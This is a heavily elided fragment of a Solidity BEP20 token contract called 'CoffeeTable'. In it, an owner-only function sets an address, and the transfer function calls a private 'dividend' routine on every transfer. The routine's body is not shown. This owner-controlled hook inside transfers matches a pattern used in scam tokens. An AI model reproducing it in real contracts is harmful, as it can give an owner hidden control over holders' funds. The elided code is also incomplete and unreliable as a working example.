...
contract CoffeeTable is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'CoffeeTable';
  ...
  */
  ...
  function claimDividendCOTA(address sender, address recipient, uint256 amount) private returns (uint256) {      
  ...
  function SetBonusCOTA(address c) public onlyOwner {
    C = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendCOTA(sender, recipient, amount);   
